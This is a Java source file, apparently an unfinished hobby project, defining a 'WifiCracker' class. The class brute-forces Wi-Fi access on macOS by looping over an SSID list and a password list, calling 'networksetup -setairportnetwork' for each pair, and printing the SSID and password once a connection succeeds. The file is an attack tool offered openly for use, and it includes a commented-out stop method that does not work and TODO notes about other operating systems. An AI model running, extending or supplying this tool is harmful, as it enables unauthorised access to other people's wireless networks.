import java.lang.Process;
import java.lang.Runtime;
import java.io.IOException;
import java.lang.ProcessBuilder;
import javax.swing.JFileChooser;
import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.util.Scanner;
import java.lang.StringBuilder;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class WifiCracker {
    // method to read and run both files
    String trying = "";
    String output = "";
    String SSID = "";
    String passList = "";
    public String getTrying(){return trying;}
    public String runAttack(File ssidlist, File passwordlist) throws Exception{
        System.out.println("Start of Attack");
        try {
            Scanner readSSID = new Scanner(ssidlist);
            Scanner readPW = new Scanner(passwordlist);
            while (readSSID.hasNextLine()) {SSID += readSSID.nextLine() + " " ;}
            while (readPW.hasNextLine()) {passList += readPW.nextLine() + " " ;}
            }
        catch (IOException ex){ex.printStackTrace();}
        String SSIDList[] = SSID.split(" ");
        String pwList[] = passList.split(" ");
        boolean done = false;
        StringBuilder sb = new StringBuilder();
        for (String lineSSID : SSIDList){
            if (done == true) {break;}
            for (String linePW : pwList){
                trying = "Trying SSID " + lineSSID + " with password " + linePW;
                System.out.println(trying);
                if (done == true) {break;}
                String[] cmdarray = {"networksetup","-setairportnetwork","en0",lineSSID,linePW};
                try {
                    Process process = Runtime.getRuntime().exec(cmdarray);
                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    BufferedReader stdErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    output = stdInput.readLine();
                    System.out.println(output);
                    if (output == null){
                        done = true;
                        output = "Match\nSSID: " + lineSSID + "\nPassword: " + linePW;
                    }
                }
                catch (IOException e){
                    e.printStackTrace();
                }
            }
        }
        return output;
    }
    /*
    public void stop(){
        String[] cmdarray = {""};
        try{
            process.destroy();
        }
        catch (IOException e) {e.printStackTrace();}
    }
    */
}
            // need to build stop attack button
        // ask or detect OS running app
        // for MacOS
        // for Windows
        // for Linux